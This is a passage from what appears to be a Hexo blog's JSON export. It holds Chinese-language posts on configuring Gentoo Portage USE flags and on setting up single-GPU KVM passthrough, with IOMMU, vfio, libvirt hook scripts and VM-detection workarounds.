CPUS</span><br>ABI_X86=<span class=\"hljs-string\">&quot;64&quot;</span><br>CPU_FLAGS_X86=<span class=\"hljs-string\">&quot;aes avx avx2 f16c fma3 mmx mmxext pclmul popcnt rdrand sha sse sse2 sse3 sse4_1 sse4_2 sse4a ssse3&quot;</span><br><br><span class=\"hljs-comment\"># cards</span><br>VIDEO_CARDS=<span class=\"hljs-string\">&quot;amdgpu radeonsi&quot;</span><br><br><span class=\"hljs-comment\"># touchpad</span><br><span class=\"hljs-comment\">#INPUT_DEVICES=&quot;libinput synaptics&quot;  ##设置后触摸板配置失效</span><br><br><span class=\"hljs-comment\"># language</span><br>L10N=<span class=\"hljs-string\">&quot;en-US zh-CN en zh&quot;</span><br>LINGUAS=<span class=\"hljs-string\">&quot;en-US zh-CN en zh&quot;</span><br><br><span class=\"hljs-comment\"># USE</span><br><br>SYSME=<span class=\"hljs-string\">&quot;-test -doc systemd&quot;</span><br>GNOME=<span class=\"hljs-string\">&quot;-kde -games -help -extras X gtk gnome&quot;</span><br>USE=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;SYSME&#125;</span> <span class=\"hljs-variable\">$&#123;GNOME&#125;</span> &quot;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"3-2-USE\"><a href=\"#3-2-USE\" class=\"headerlink\" title=\"3.2 USE\"></a>3.2 USE</h2><p>个人 <code>USE</code> 使用说明：</p>\n<ul>\n<li><code>/etc/portage/make.conf</code> 仅添加必要 <code>flag</code> 且尽量仅添加排除项。<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">SYSME=<span class=\"hljs-string\">&quot;-test -doc systemd&quot;</span><br>GNOME=<span class=\"hljs-string\">&quot;-kde -games -help -extras X gtk gnome&quot;</span><br>USE=<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">$&#123;SYSME&#125;</span> <span class=\"hljs-variable\">$&#123;GNOME&#125;</span> &quot;</span><br></code></pre></td></tr></table></figure></li>\n<li><code>/etc/portage/package.accept_keywords</code> 文件夹中创建文件，添加需要开启 <code>~amd</code>(测试) 属性的包<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-office/wps-office ~*<br></code></pre></td></tr></table></figure></li>\n<li><code>/etc/portage/package.use</code> 文件夹中创建文件，添加与 <code>/etc/portage/make.conf</code> 中 <code>USE</code> 相悖或者仅对该包生效的 <code>flag</code><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-emulation/qemu spice QEMU_SOFTMMU_TARGETS: x86_64 QEMU_USER_TARGETS: x86_64<br>net-dns/dnsmasq script<br>net-misc/spice-gtk usbredir<br></code></pre></td></tr></table></figure></li>\n</ul>\n<h1 id=\"4-tools\"><a href=\"#4-tools\" class=\"headerlink\" title=\"4 tools\"></a>4 tools</h1><h2 id=\"4-1-包管理\"><a href=\"#4-1-包管理\" class=\"headerlink\" title=\"4.1 包管理\"></a>4.1 包管理</h2><h3 id=\"4-1-1-app-portage-x2F-eix\"><a href=\"#4-1-1-app-portage-x2F-eix\" class=\"headerlink\" title=\"4.1.1 app-portage&#x2F;eix\"></a>4.1.1 app-portage&#x2F;eix</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-portage/eix<br>app-portage/gentoolkit<br>app-portage/layman<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-2-文件系统\"><a href=\"#4-2-文件系统\" class=\"headerlink\" title=\"4.2 文件系统\"></a>4.2 文件系统</h2><h3 id=\"4-2-1-sys-fs-x2F-lvm2\"><a href=\"#4-2-1-sys-fs-x2F-lvm2\" class=\"headerlink\" title=\"4.2.1 sys-fs&#x2F;lvm2\"></a>4.2.1 sys-fs&#x2F;lvm2</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">sys-fs/lvm2<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-2-2-ntfs\"><a href=\"#4-2-2-ntfs\" class=\"headerlink\" title=\"4.2.2 ntfs\"></a>4.2.2 ntfs</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">sys-fs/ntfs3g<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-3-DE\"><a href=\"#4-3-DE\" class=\"headerlink\" title=\"4.3 DE\"></a>4.3 DE</h2><h3 id=\"4-3-1-gnome\"><a href=\"#4-3-1-gnome\" class=\"headerlink\" title=\"4.3.1 gnome\"></a>4.3.1 gnome</h3><blockquote>\n<p>一定要有swap分区，否则编译不会通过<br>make。conf 中 MAKEOPTS&#x3D;”-j4” 此条不存在编译也会失败</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">gnome-base/gnome<br>gnome-base/gconf<br>gnome-extra/gnome-tweaks<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-4-vitual\"><a href=\"#4-4-vitual\" class=\"headerlink\" title=\"4.4 vitual\"></a>4.4 vitual</h2><h3 id=\"4-4-1-virtualbox\"><a href=\"#4-4-1-virtualbox\" class=\"headerlink\" title=\"4.4.1 virtualbox\"></a>4.4.1 virtualbox</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-emulation/virtualbox<br>app-emulation/virtualbox-additions<br>app-emulation/virtualbox-extpack-oracle<br>app-emulation/virtualbox-modules<br>app-emulation/virtualbox-guest-additions  <span class=\"hljs-comment\"># gentoo虚拟机安装</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-4-2-kvm\"><a href=\"#4-4-2-kvm\" class=\"headerlink\" title=\"4.4.2 kvm\"></a>4.4.2 kvm</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">app-emulation/qemu<br>app-emulation/libvirt<br>app-emulation/virt-manager<br>net-misc/bridge-utils<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">usermod -a -G libvirt miloo<br>usermod -a -G kvm miloo <br>systemctl <span class=\"hljs-built_in\">enable</span> libvirtd<br>systemctl <span class=\"hljs-built_in\">enable</span> virtlogd-admin.socket<br></code></pre></td></tr></table></figure>\n\n\n<h1 id=\"5-系统迁移\"><a href=\"#5-系统迁移\" class=\"headerlink\" title=\"5 系统迁移\"></a>5 系统迁移</h1><h2 id=\"5-1-权限备份与恢复\"><a href=\"#5-1-权限备份与恢复\" class=\"headerlink\" title=\"5.1 权限备份与恢复\"></a>5.1 权限备份与恢复</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">getfacl -R ./ &gt; acl.txt<br>setfacl --restore=acl.txt<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"5-2-用户组\"><a href=\"#5-2-用户组\" class=\"headerlink\" title=\"5.2 用户组\"></a>5.2 用户组</h2><figure class=\"highlight gcode\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gcode\">用户id=<span class=\"hljs-number\">1001</span><span class=\"hljs-comment\">(miloo)</span> 组id=<span class=\"hljs-number\">100</span><span class=\"hljs-comment\">(users)</span> 组=<span class=\"hljs-number\">100</span><span class=\"hljs-comment\">(users)</span>,<span class=\"hljs-number\">10</span><span class=\"hljs-comment\">(wheel)</span>,<span class=\"hljs-number\">11</span><span class=\"hljs-comment\">(floppy)</span>,<span class=\"hljs-number\">18</span><span class=\"hljs-comment\">(audio)</span>,<span class=\"hljs-number\">19</span><span class=\"hljs-comment\">(cdrom)</span>,<span class=\"hljs-number\">27</span><span class=\"hljs-comment\">(video)</span>,<span class=\"hljs-number\">85</span><span class=\"hljs-comment\">(usb)</span>,<span class=\"hljs-number\">78</span><span class=\"hljs-comment\">(kvm)</span>,<span class=\"hljs-number\">272</span><span class=\"hljs-comment\">(plugdev)</span>,<span class=\"hljs-number\">172</span><span class=\"hljs-comment\">(pulse-access)</span>,<span class=\"hljs-number\">304</span><span class=\"hljs-comment\">(vboxusers)</span>,<span class=\"hljs-number\">79</span><span class=\"hljs-comment\">(libvirt)</span><br></code></pre></td></tr></table></figure>\n"},{"title":"kvm 显卡直通(单显卡)","excerpt":"kvm显卡直通配置过程……","index_img":"/img/article-head/kvm.jpeg","date":"2022-07-14T02:46:25.000Z","updated":"2022-08-09T06:46:25.000Z","hide":false,"_content":"\n- [1 安装](#1-安装)\n- [2 配置](#2-配置)\n  - [2.1 桥接](#21-桥接)\n  - [2.2 iommu](#22-iommu)\n  - [2.3 内核模块添加](#23-内核模块添加)\n  - [2.4 hook 脚本](#24-hook-脚本)\n  - [2.5 QEMU 配置](#25-qemu-配置)\n- [3 直通](#3-直通)\n  - [3.1 创建不直通的虚拟机](#31-创建不直通的虚拟机)\n  - [3.2 vbios](#32-vbios)\n  - [3.3 添加直通设备](#33-添加直通设备)\n- [4 问题解决](#4-问题解决)\n  - [4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)](#41-软件不能运行在虚拟机上sorry-this-program-cannot-run-under-a-virtual-machine)\n  - [4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)](#42-黑屏ucsi_cgg-1-0008-ucsi_handle_connector_change-get_connector_status-failed)\n  - [4.2 docker 桥接占用物理网卡导致网络不通的情况](#42-docker-桥接占用物理网卡导致网络不通的情况)\n\n# 1 安装\n\n```bash\napp-emulation/qemu\napp-emulation/libvirt\napp-emulation/virt-manager\nnet-misc/bridge-utils\nsys-firmware/edk2-ovmf\n```\n\n```bash\nusermod -a -G libvirt miloo\nusermod -a -G kvm miloo \nsystemctl enable libvirtd\nsystemctl enable virtlogd-admin.socket\n```\n\n# 2 配置\n\n```bash\nworisur ~ # neofetch\n         -/oyddmdhs+:.                root@worisur\n     -odNMMMMMMMMNNmhy+-`             ------------\n   -yNMMMMMMMMMMMNNNmmdhy+-           OS: Gentoo Base System release 2.8 x86_64\n `omMMMMMMMMMMMMNmdmmmmddhhy/`        Kernel: 5.15.52-gentoo-dist\n omMMMMMMMMMMMNhhyyyohmdddhhhdo`      Uptime: 19 hours, 43 mins\n.ydMMMMMMMMMMdhs++so/smdddhhhhdm+`    Packages: 975 (emerge)\n oyhdmNMMMMMMMNdyooydmddddhhhhyhNd.   Shell: bash 5.1.16\n  :oyhhdNNMMMMMMMNNNmmdddhhhhhyymMh   Terminal: /dev/pts/0\n    .:+sydNMMMMMNNNmmmdddhhhhhhmMmy   CPU: AMD Ryzen 9 5900X (24) @ 3.700GHz\n       /mMMMMMMNNNmmmdddhhhhhmMNhs:   GPU: AMD ATI Radeon RX 6800/6800 XT / 6900 XT\n    `oNMMMMMMMNNNmmmddddhhdmMNhs+`    Memory: 33068MiB / 64220MiB\n  `sNMMMMMMMMNNNmmmdddddmNMmhs/.\n /NMMMMMMMMNNNNmmmdddmNMNdso:`\n+MMMMMMMNNNNNmmmmdmNMNdso/-\nyMMNNNNNNNmmmmmNNMmhs+/-`\n/hMMNNNNNNNNMNdhs++/-`\n`/ohdmmddhys+++/:.`\n  `-//////:--.\n```\n\n## 2.1 桥接\n\n[无线网卡看这里](https://blog.51cto.com/u_3823536/2547591)\n\n[brctl配置看这里](https://support.huaweicloud.com/dpmg-kunpengwebs/kunpengtomee_04_0008.html)\n\n- 我的做法:\n\nNetworkManager 直接使用 `nmtui` 将需要桥接的网卡加进新建的网桥(并将该网卡的mac地址配置给网桥),然后给网桥配置静态的地址(配置方式和普通网卡没区别),设置开机启动\n\n## 2.2 iommu\n\n```bash\ncat /etc/default/grub\n# 添加如下行\n# AMD处理器(根据BIOS设置默认已启用？)：amd_iommu=on\n# 可视情况添加（修复或导致黑屏）：iommu=pt\nGRUB_CMDLINE_LINUX_DEFAULT=\"amd_iommu=on iommu=pt\"\n\n```\n\n重启后,看看启动日志检查一下IOMMU是否已启用,使用超级用户权限运行\n\n```bash\nworisur ~ # dmesg | grep -e DMAR -e iommu\n[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt\n[    0.067146] Kernel command line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt\n[    0.531545] iommu: Default domain type: Passthrough (set via kernel command line)\n[    0.547978] pci 0000:00:01.0: Adding to iommu group 0\n[    0.547984] pci 0000:00:01.1: Adding to iommu group 1\n[    0.547991] pci 0000:00:01.2: Adding to iommu group 2\n[    0.547997] pci 0000:00:02.0: Adding to iommu group 3\n[    0.548004] pci 0000:00:03.0: Adding to iommu group 4\n[    0.548010] pci 0000:00:03.1: Adding to iommu group 5\n[    0.548016] pci 0000:00:04.0: Adding to iommu group 6\n[    0.548022] pci 0000:00:05.0: Adding to iommu group 7\n[    0.548029] pci 0000:00:07.0: Adding to iommu group 8\n[    0.548034] pci 0000:00:07.1: Adding to iommu group 9\n[    0.548040] pci 0000:00:08.0: Adding to iommu group 10\n[    0.548046] pci 0000:00:08.1: Adding to iommu group 11\n[    0.548054] pci 0000:00:14.0: Adding to iommu group 12\n[    0.548059] pci 0000:00:14.3: Adding to iommu group 12\n[    0.548075] pci 0000:00:18.0: Adding to iommu group 13\n[    0.548079] pci 0000:00:18.1: Adding to iommu group 13\n[    0.548084] pci 0000:00:18.2: Adding to iommu group 13\n[    0.548089] pci 0000:00:18.3: Adding to iommu group 13\n[    0.548093] pci 0000:00:18.4: Adding to iommu group 13\n[    0.548098] pci 0000:00:18.5: Adding to iommu group 13\n[    0.548102] pci 0000:00:18.6: Adding to iommu group 13\n[    0.548107] pci 0000:00:18.7: Adding to iommu group 13\n[    0.548112] pci 0000:01:00.0: Adding to iommu group 14\n[    0.548122] pci 0000:02:00.0: Adding to iommu group 15\n[    0.548128] pci 0000:02:00.1: Adding to iommu group 15\n[    0.548133] pci 0000:02:00.2: Adding to iommu group 15\n[    0.548136] pci 0000:03:00.0: Adding to iommu group 15\n[    0.548139] pci 0000:03:04.0: Adding to iommu group 15\n[    0.548142] pci 0000:03:08.0: Adding to iommu group 15\n[    0.548144] pci 0000:03:09.0: Adding to iommu group 15\n[    0.548147] pci 0000:05:00.0: Adding to iommu group 15\n[    0.548150] pci 0000:06:00.0: Adding to iommu group 15\n[    0.548153] pci 0000:07:00.0: Adding to iommu group 15\n[    0.548159] pci 0000:08:00.0: Adding to iommu group 16\n[    0.548165] pci 0000:09:00.0: Adding to iommu group 17\n[    0.548289] pci 0000:0a:00.0: Adding to iommu group 18\n[    0.548297] pci 0000:0a:00.1: Adding to iommu group 19\n[    0.548306] pci 0000:0a:00.2: Adding to iommu group 20\n[    0.548314] pci 0000:0a:00.3: Adding to iommu group 21\n[    0.548320] pci 0000:0b:00.0: Adding to iommu group 22\n[    0.548326] pci 0000:0c:00.0: Adding to iommu group 23\n[    0.548332] pci 0000:0c:00.1: Adding to iommu group 24\n[    0.548338] pci 0000:0c:00.3: Adding to iommu group 25\n[    0.548344] pci 0000:0c:00.4: Adding to iommu group 26\n[    0.549234] perf/amd_iommu: Detected AMD IOMMU #0 (2 banks, 4 counters/bank).\n```\n\n查看显卡相关信息：\n\n```bash\nshopt -s nullglob\nfor g in `find /sys/kernel/iommu_groups/* -maxdepth 0 -type d | sort -V`; do\n    echo \"IOMMU Group ${g##*/}:\"\n    for d in $g/devices/*; do\n        echo -e \"\\t$(lspci -nns ${d##*/})\"\n    done;\ndone;\n\n# 结果\n\nIOMMU Group 16:\n        08:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Upstream Port of PCI Express Switch [1002:1478] (rev c1)\nIOMMU Group 17:\n        09:00.0 PCI bridge [0604]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 10 XL Downstream Port of PCI Express Switch [1002:1479]\nIOMMU Group 18:\n        0a:00.0 VGA compatible controller [0300]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 [Radeon RX 6800/6800 XT / 6900 XT] [1002:73bf] (rev c1)\nIOMMU Group 19:\n        0a:00.1 Audio device [0403]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21/23 HDMI/DP Audio Controller [1002:ab28]\nIOMMU Group 20:\n        0a:00.2 USB controller [0c03]: Advanced Micro Devices, Inc. [AMD/ATI] Device [1002:73a6]\nIOMMU Group 21:\n        0a:00.3 Serial bus controller [0c80]: Advanced Micro Devices, Inc. [AMD/ATI] Navi 21 USB [1002:73a4]\n```\n\n## 2.3 内核模块添加\n\n```bash\n# 配置ids内容\nworisur ~ # cat /etc/modprobe.d/vfio.conf\noptions vfio-pci ids=1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479\noptions vfio-pci disable_idle_d3=1\noptions vfio-pci disable_vga=1\n```\n\n## 2.4 hook 脚本\n\n```bash\nworisur /etc/libvirt/hooks # cat qemu\n#!/bin/bash\nOBJECT=\"$1\"\nOPERATION=\"$2\"\n\nif [ $OBJECT == \"miloo\" ] || [ $OBJECT == \"mod\" ] || [ $OBJECT == \"work\" ]; then\n        case \"$OPERATION\" in\n                \"prepare\")\n                systemctl start libvirt-nosleep@\"$OBJECT\"  2>&1 | tee -a /var/log/libvirt/custom_hooks.log\n                /bin/vfio-startup.sh 2>&1 | tee -a /var/log/libvirt/custom_hooks.log\n                ;;\n\n            \"release\")\n                systemctl stop libvirt-nosleep@\"$OBJECT\"  2>&1 | tee -a /var/log/libvirt/custom_hooks.log\n                /bin/vfio-teardown.sh 2>&1 | tee -a /var/log/libvirt/custom_hooks.log\n                ;;\n        esac\nfi\n```\n\n```bash\nworisur /etc/libvirt/hooks # cat vfio-startup.sh\n#!/bin/bash\n# Helpful to read output when debugging\nset -x\n\nlong_delay=10\nmedium_delay=5\nshort_delay=1\necho \"Beginning of startup!\"\n\nfunction stop_display_manager_if_running {\n    # Stop dm using systemd\n    if command -v systemctl; then\n        if systemctl is-active --quiet \"$1.service\" ; then\n            echo $1 >> /tmp/vfio-store-display-manager\n            systemctl stop \"$1.service\"\n        fi\n\n        while systemctl is-active --quiet \"$1.service\" ; do\n            sleep \"${medium_delay}\"\n        done\n\n        return\n    fi\n\n    # Stop dm using runit\n    if command -v sv; then\n        if sv status $1 ; then\n            echo $1 >> /tmp/vfio-store-display-manager\n            sv stop $1\n        fi\n    fi\n}\n\n# Stop currently running display manager\nif test -e \"/tmp/vfio-store-display-manager\" ; then\n    rm -f /tmp/vfio-store-display-manager\nfi\n\nstop_display_manager_if_running gdm\nstop_display_manager_if_running display-manager\n\nsleep \"${medium_delay}\"\n\n# Unbind VTconsoles if currently bound (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)\nif test -e \"/tmp/vfio-bound-consoles\" ; then\n    rm -f /tmp/vfio-bound-consoles\nfi\nfor (( i = 0; i < 16; i++))\ndo\n  if test -x /sys/class/vtconsole/vtcon${i}; then\n      if [ `cat /sys/class/vtconsole/vtcon${i}/name | grep -c \"frame buffer\"` \\\n           = 1 ]; then\n               echo 0 > /sys/class/vtconsole/vtcon${i}/bind\n           echo \"Unbinding console ${i}\"\n           echo $i >> /tmp/vfio-bound-consoles\n      fi\n  fi\ndone\n\n# Unbind EFI-Framebuffer\nif test -e \"/tmp/vfio-is-nvidia\" ; then\n    rm -f /tmp/vfio-is-nvidia\nfi\n\nif lsmod | grep \"nvidia\" &> /dev/null ; then\n    echo \"true\" >> /tmp/vfio-is-nvidia\n    echo efi-framebuffer.0 > /sys/bus/platform/drivers/efi-framebuffer/unbind\nfi\n\necho \"End of startup!\"\n```\n\n```bash\nworisur /etc/libvirt/hooks # cat vfio-teardown.sh\n#!/bin/bash\nset -x\n\necho \"Beginning of teardown!\"\n\nsleep 10\n\n# Restart Display Manager\ninput=\"/tmp/vfio-store-display-manager\"\nwhile read displayManager; do\n  if command -v systemctl; then\n    systemctl start \"$displayManager.service\"\n  else\n    if command -v sv; then\n      sv start $displayManager\n    fi\n  fi\ndone < \"$input\"\n\n# Rebind VT consoles (adapted from https://www.kernel.org/doc/Documentation/fb/fbcon.txt)\ninput=\"/tmp/vfio-bound-consoles\"\nwhile read consoleNumber; do\n  if test -x /sys/class/vtconsole/vtcon${consoleNumber}; then\n      if [ `cat /sys/class/vtconsole/vtcon${consoleNumber}/name | grep -c \"frame buffer\"` \\\n           = 1 ]; then\n    echo \"Rebinding console ${consoleNumber}\"\n          echo 1 > /sys/class/vtconsole/vtcon${consoleNumber}/bind\n      fi\n  fi\ndone < \"$input\"\n\n# Rebind framebuffer for nvidia\nif test -e \"/tmp/vfio-is-nvidia\" ; then\n  echo \"efi-framebuffer.0\" > /sys/bus/platform/drivers/efi-framebuffer/bind\nfi\n\necho \"End of teardown!\"\n```\n\n```bash\n# 权限为 kvm 用户 组为 libvirt\nworisur /etc/libvirt/hooks # ls -al\n总用量 20\ndrwxr-xr-x 2 miloo libvirt 4096  7月 14 23:35 .\ndrwxr-xr-x 7 root  root    4096  7月 13 01:25 ..\n-rwxr-xr-x 1 miloo libvirt  622  7月 14 23:32 qemu\n-rwxr-xr-x 1 miloo libvirt 1981  7月 13 02:06 vfio-startup.sh\n-rwxr-xr-x 1 miloo libvirt  972  7月 13 02:07 vfio-teardown.sh\n```\n\n## 2.5 QEMU 配置  \n\n```bash\n# /etc/libvirt/libvirtd.conf 修改如下行：\nworisur /etc/libvirt # cat libvirtd.conf\nunix_sock_group = \"libvirt\"\nunix_sock_rw_perms = \"0770\"\nlog_filters=\"1:qemu\"\nlog_outputs=\"1:file:/var/log/libvirt/libvirtd.log\"\n\n# # /etc/libvirt/qemu.conf 修改如下行：\nworisur /etc/libvirt # cat qemu.conf\nuser = \"miloo\"\ngroup = \"libvirt\"\n```\n\n# 3 直通\n\n## 3.1 创建不直通的虚拟机\n\n- 下载[驱动](https://github.com/virtio-win/virtio-win-pkg-scripts/blob/master/README.md)\n- 芯片组：Q35\n- 固件：ovmf_code.fd\n\n## 3.2 vbios\n\n[gpuz提取](http://www.xiaobaixitong.com/help/43692.html)\n\n[此处下载](https://www.techpowerup.com/vgabios/?architecture=&manufacturer=&model=RX+6800+XT&interface=&memType=&memSize=&since=)\n\n## 3.3 添加直通设备\n\n1. 打开虚拟机管理器,把显卡的所有pci部分都添加到虚拟机里面。\n> pci设备：1002:73bf,1002:ab28,1002:73a6,1002:73a4,1002:1478,1002:1479\n1. 启用XML编辑, 在显卡的所有pci设备里面, 在</source>之后添加: ```<rom bar=\"on\" file=\"vbios路径\"/>```\n2. 把串口,显示协议,信道,usb转接,显卡qxl,触摸板那些东西删掉\n3. 添加你的USB设备,比如鼠标、键盘和USB耳机。\n\n# 4 问题解决\n\n## 4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)\n\n- Pass the SMBIOS information to the guest\n- Pass the exact host's CPU model to the guest\n- Hide the \"hypervisor\" feature from the CPU\n- In the \"features > hyperv\" section, add a vendor_id\n- In the \"features\" section, hide kvm.\n\n```xml\n<os>\n  <smbios mode='host'/>\n  ...\n</os>\n...\n<features>\n  <hyperv>\n    ...\n    <vendor_id state='on' value='123456789ab'/>\n  </hyperv>\n  <kvm>\n    <hidden state='on'/>\n    <hint-dedicated state='on'/>\n  </kvm>\n  ...\n</features>\n...\n<cpu mode='host-passthrough'>\n  ...\n  <feature policy='disable' name='hypervisor'/>\n</cpu>\n```\n\n## 4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)\n\n- `ucsi_cgg` 为英伟达显卡的 `mod` 直接屏蔽就好\n\n```bash\n/etc/modprobe.d # cat blacklist-nvidia-usb.conf\nblacklist ucsi_ccg\n```\n\n## 4.2 docker 桥接占用物理网卡导致网络不通的情况\n\n- 添加或修改 `/etc/docker/daemon.json` 将 kvm 的桥接网卡直接赋给 docker\n\n```bash\n{\n  \"bridge\": \"virbr\",\n  \"default-gateway\": \"*.*.*.*\"\n}\n```\n","source":"_posts/2022-07-14.kvm显卡直通.md","raw":"---\ntitle: kvm 显卡直通(单显卡)\nexcerpt: kvm显卡直通配置过程……\nindex_img: /img/article-head/kvm.jpeg\ndate: \"2022/7/14 10:46:25\"\nupdated: \"2022/8/9 14:46:25\"\nhide: false\ntags:\n- Linux\n- kvm\ncategories:\n- Linux\n- kvm\n---\n\n- [1 安装](#1-安装)\n- [2 配置](#2-配置)\n  - [2.1 桥接](#21-桥接)\n  - [2.2 iommu](#22-iommu)\n  - [2.3 内核模块添加](#23-内核模块添加)\n  - [2.4 hook 脚本](#24-hook-脚本)\n  - [2.5 QEMU 配置](#25-qemu-配置)\n- [3 直通](#3-直通)\n  - [3.1 创建不直通的虚拟机](#31-创建不直通的虚拟机)\n  - [3.2 vbios](#32-vbios)\n  - [3.3 添加直通设备](#33-添加直通设备)\n- [4 问题解决](#4-问题解决)\n  - [4.1 软件不能运行在虚拟机上(Sorry, this program cannot run under a virtual machine)](#41-软件不能运行在虚拟机上sorry-this-program-cannot-run-under-a-virtual-machine)\n  - [4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)](#42-黑屏ucsi_cgg-1-0008-ucsi_handle_connector_change-get_connector_status-failed)\n  - [4.2 docker 桥接占用物理网卡导致网络不通的情况](#42-docker-桥接占用物理网卡导致网络不通的情况)\n\n# 1 安装\n\n```bash\napp-emulation/qemu\napp-emulation/libvirt\napp-emulation/virt-manager\nnet-misc/bridge-utils\nsys-firmware/edk2-ovmf\n```\n\n```bash\nusermod -a -G libvirt miloo\nusermod -a -G kvm miloo \nsystemctl enable libvirtd\nsystemctl enable virtlogd-admin.socket\n```\n\n# 2 配置\n\n```bash\nworisur ~ # neofetch\n         -/oyddmdhs+:.                root@worisur\n     -odNMMMMMMMMNNmhy+-`             ------------\n   -yNMMMMMMMMMMMNNNmmdhy+-           OS: Gentoo Base System release 2.8 x86_64\n `omMMMMMMMMMMMMNmdmmmmddhhy/`        Kernel: 5.15.52-gentoo-dist\n omMMMMMMMMMMMNhhyyyohmdddhhhdo`      Uptime: 19 hours, 43 mins\n.ydMMMMMMMMMMdhs++so/smdddhhhhdm+`    Packages: 975 (emerge)\n oyhdmNMMMMMMMNdyooydmddddhhhhyhNd.   Shell: bash 5.1.16\n  :oyhhdNNMMMMMMMNNNmmdddhhhhhyymMh   Terminal: /dev/pts/0\n    .:+sydNMMMMMNNNmmmdddhhhhhhmMmy   CPU: AMD Ryzen 9 5900X (24) @ 3.700GHz\n       /mMMMMMMNNNmmmdddhhhhhmMNhs:   GPU: AMD ATI Radeon RX 6800/6800 XT / 6900 XT\n    `oNMMMMMMMNNNmmmddddhhdmMNhs+`    Memory: 33068MiB / 64220MiB\n  `sNMMMMMMMMNNNmmmdddddmNMmhs/.\n /NMMMMMMMMNNNNmmmdddmNMNdso:`\n+MMMMMMMNNNNNmmmmdmNMNdso/-\nyMMNNNNNNNmmmmmNNMmhs+/-`\n/hMMNNNNNNNNMNdhs++/-`\n`/ohdmmddhys+++/:.`\n  `-//////:--.\n```\n\n## 2.1 桥接\n\n[无线网卡看这里](https://blog.51cto.com/u_3823536/2547591)\n\n[brctl配置看这里](https://support.huaweicloud.com/dpmg-kunpengwebs/kunpengtomee_04_0008.html)\n\n- 我的做法:\n\nNetworkManager 直接使用 `nmtui` 将需要桥接的网卡加进新建的网桥(并将该网卡的mac地址配置给网桥),然后给网桥配置静态的地址(配置方式和普通网卡没区别),设置开机启动\n\n## 2.2 iommu\n\n```bash\ncat /etc/default/grub\n# 添加如下行\n# AMD处理器(根据BIOS设置默认已启用？)：amd_iommu=on\n# 可视情况添加（修复或导致黑屏）：iommu=pt\nGRUB_CMDLINE_LINUX_DEFAULT=\"amd_iommu=on iommu=pt\"\n\n```\n\n重启后,看看启动日志检查一下IOMMU是否已启用,使用超级用户权限运行\n\n```bash\nworisur ~ # dmesg | grep -e DMAR -e iommu\n[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt\n[    0.067146] Kernel command line: BOOT_IMAGE=/vmlinuz-5.15.52-gentoo-dist root=UUID=c9ffa84e-ef8f-45f0-b508-18d12102fbbc ro amd_iommu=on iommu=pt\n[    0.531545] iommu: Default domain type: 